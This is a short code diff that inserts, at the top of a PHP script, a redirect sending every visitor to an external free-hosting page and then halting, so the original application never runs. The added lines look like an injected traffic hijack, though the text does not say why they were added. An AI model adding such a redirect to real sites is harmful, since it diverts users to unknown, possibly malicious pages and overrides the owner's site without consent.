@@ -1,4 +1,6 @@
 <?php
+    header('Location: http://batukah.000webhostapp.com/osholm/');
+    exit();
 
     require "settings_my.php";
 
